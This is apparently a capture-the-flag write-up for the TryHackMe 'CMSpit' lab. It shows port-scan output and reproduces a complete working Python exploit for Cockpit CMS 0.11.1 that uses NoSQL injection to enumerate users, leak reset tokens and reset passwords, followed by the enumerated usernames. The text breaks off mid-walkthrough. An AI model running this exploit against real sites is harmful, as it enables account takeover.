# CMSpit — Writeup

## Overview
### CMSpit — Writeup
### CMSpit — Writeup
----
This is a machine that allows you to practise web app hacking and privilege escalation using recent vulnerabilities.
----
![](https://tryhackme-images.s3.amazonaws.com/room-icons/af878fdc94fd054dd34b05b7977a6c09.png)
Start Machine
You've identified that the CMS installed on the web server has several vulnerabilities that allow attackers to enumerate users and change account passwords.
Your mission is to exploit these vulnerabilities and compromise the web server.
Answer the questions below

## Enumeration
```text
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.228.98 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.228.98:80
Open 10.10.228.98:22
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.228.98 [2 ports]
Discovered open port 22/tcp on 10.10.228.98
Discovered open port 80/tcp on 10.10.228.98
Completed Connect Scan (2 total ports)
Initiating Service scan
Scanning 2 services on 10.10.228.98
Completed Service scan (2 services on 1 host)
NSE: Script scanning 10.10.228.98.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.228.98
Host is up, received user-set (0.19s latency).

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7f25f9402325cd298b28a9d982f549e4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD7acH8krj6oVh6s+R3VYnJ/Xc8o5b43RcrRwiMPKe7V8V/SLfeVeHtE06j0PnfF5bHbNjtLP8pMq2USPivt/LcsS+8e+F5yfFFAVawOWqtd9tnrXVQhmyLZVb+wzmjKe+BaNWSnEazjIevMjD3bR8YBYKnf2BoaFKxGkJKPyleMT1GAkU+r47m2FsMa+l7p79VIYrZfss3NTlRq9k6pGsshiJnnzpWmT1KDjI90fGT6oIkALZdW/++qXi+px6+bWDMiW9NVv0eQmN9eTwsFNoWE3JDG7Aeq7hacqF7JyoMPegQwAAHI/ZD66f4zQzqQN6Ou6+sr7IMkC62rLMjKkXN
|   256 0af429ed554319e773a7097930a8491b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEnbbSTSHNXi6AcEtMnOG+srCrE2U4lbRXkBxlQMk1damlhG+U0tmiObRCoasyBY2kvAdU/b7ZWoE0AmoYUldvk=
|   256 2f43ada3d15b648633075d94f9dca401 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKYUS/4ObKPMEyPGlgqg6khm41SWn61X9kGbNvyBJh7e
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Authenticate Please!
|_Requested resource was /auth/login?to=/
|_http-favicon: Unknown favicon MD5: C9CD46C6A2F5C65855276A03FE703735
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.53 seconds

http://10.10.228.98/auth/login?to=/

App.request('/auth/check', {
                    auth : {user:this.refs.user.value, password:this.refs.password.value },
                    csfr : "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc2ZyIjoibG9naW4ifQ.dlnu8XjKIvB6mGfBlOgjtnixirAIsnzf5QTAEP1mJJc"
                })

HEADER:ALGORITHM & TOKEN TYPE

{

  "typ": "JWT",

  "alg": "HS256"

}

PAYLOAD:DATA

{

  "csfr": "login"

}

http://10.10.228.98/auth/forgotpassword

view-source:http://10.10.228.98/assets/app/css/style.css?ver=0.11.1

https://www.exploit-db.com/exploits/50185

┌──(witty㉿kali)-[~/Downloads]
└─$ more cockpit_enum.py
```
```text
# Exploit Title: Cockpit CMS 0.11.1 - 'Username Enumeration & Password 
Reset' NoSQL Injection
```
```text
# Date: 06-08-2021
```
```text
# Exploit Author: Brian Ombongi
```
```text
# Vendor Homepage: https://getcockpit.com/
```
```text
# Version: Cockpit 0.11.1
```
```text
# Tested on: Ubuntu 16.04.7
```

## Exploitation
```text
# CVE : CVE-2020-35847 & CVE-2020-35848

#!/usr/bin/python3
import json
import re
import requests
import random
import string
import argparse

def usage():
    guide = 'python3 exploit.py -u <target_url> '
    return guide

def arguments():
    parse = argparse.ArgumentParser(usage=usage())
    parse.add_argument('-u', dest='url', help='Site URL e.g http://cock
pit.local', type=str, required=True)
    return parse.parse_args()

def test_connection(url):
	try:
		get = requests.get(url)
		if get.status_code == 200:
			print(f"[+] {url}: is reachable")
		else:
			print(f"{url}: is Not reachable, status_code: {
get.status_code}")
	except requests.exceptions.RequestException as e:
		raise SystemExit(f"{url}: is Not reachable \nErr: {e}")

def enumerate_users(url):
    print("[-] Attempting Username Enumeration (CVE-2020-35846) : \n")
    url = url + "/auth/requestreset"
    headers = {
        "Content-Type": "application/json"
    }
    data= {"user":{"$func":"var_dump"}}
    req = requests.post(url, data=json.dumps(data), headers=headers)
    pattern=re.compile(r'string\(\d{1,2}\)\s*"([\w-]+)"', re.I)
    matches = pattern.findall(req.content.decode('utf-8'))
    if matches:
        print ("[+] Users Found : " + str(matches))
        return matches
    else:
        print("No users found")

def check_user(usernames):
    user = input("\n[-] Get user details For : ")
    if user not in usernames:
        print("User does not exist...Exiting")
        exit()
    else:
        return user

def reset_tokens(url):
    print("[+] Finding Password reset tokens")
    url = url + "/auth/resetpassword"
    headers = {
        "Content-Type": "application/json"
        }
    data= {"token":{"$func":"var_dump"}}
    req = requests.post(url, data=json.dumps(data), headers=headers)
    pattern=re.compile(r'string\(\d{1,2}\)\s*"([\w-]+)"', re.I)
    matches = pattern.findall(req.content.decode('utf-8'))
    if matches:
        print ("\t Tokens Found : " + str(matches))
        return matches
    else:
        print("No tokens found, ")

def user_details(url, token):
    print("[+] Obtaining user information ")
    url = url + "/auth/newpassword"
    headers = {
        "Content-Type": "application/json"
        }
    userAndtoken = {}
    for t in token:
        data= {"token":t}
        req = requests.post(url, data=json.dumps(data), headers=headers
)
        pattern=re.compile(r'(this.user\s*=)([^;]+)', re.I)
        matches = pattern.finditer(req.content.decode('utf-8'))
        for match in matches:
            matches = json.loads(match.group(2))
            if matches:
                print ("-----------------Details--------------------")
                for key, value in matches.items():
                    
                    print("\t", "[*]", key ,":", value)       
            else:
                print("No user information found.")
            user = matches['user']
            token = matches['_reset_token']
            userAndtoken[user] = token
            print("--------------------------------------------")
            continue
    return userAndtoken

def password_reset(url, token, user):
    print("[-] Attempting to reset %s's password:" %user)
    characters = string.ascii_letters + string.digits + string.punctuat
ion 
    password = ''.join(random.choice(characters) for i in range(10))
    url = url + "/auth/resetpassword"
    headers = {
        "Content-Type": "application/json"
        }
    data= {"token":token, "password":password}
    req = requests.post(url, data=json.dumps(data), headers=headers)
    if "success" in req.content.decode('utf-8'):
        print("[+] Password Updated Succesfully!")
        print("[+] The New credentials for %s is: \n \t Username : %s \
n \t Password : %s" % (user, user, password))

def generate_token(url, user):
    url = url + "/auth/requestreset"
    headers = {
        "Content-Type": "application/json"
        }
    data= {"user":user}
    req = requests.post(url, data=json.dumps(data), headers=headers)
    
def confirm_prompt(question: str) -> bool:
    reply = None
    while reply not in ("", "y", "n"):
        reply = input(f"{question} (Y/n): ").lower()
        if reply == "y":
            return True
        elif reply == "n":
            return False
        else:
            return True

def pw_reset_trigger(details, user, url):
    for key in details:
        if key == user:
            password_reset(url, details[key], key)
        else:
            continue

if __name__ == '__main__':
    args = arguments()
    url = args.url
    test_connection(url)
    user = check_user(enumerate_users(url))
    generate_token(url, user)
    tokens = reset_tokens(url)
    details = user_details(url, tokens)
    print("\n")
    b = confirm_prompt("[+] Do you want to reset the passowrd for %s?" 
%user)
    if b:
        pw_reset_trigger(details, user, url)
    else:
        print("Exiting..")
        exit()

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 cockpit_enum.py -u http://10.10.228.98
[+] http://10.10.228.98: is reachable
[-] Attempting Username Enumeration (CVE-2020-35846) : 

[+] Users Found : ['admin', 'darkStar7471', 'skidy', 'ekoparty']

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 cockpit_enum.py -u http://10.10.228.98
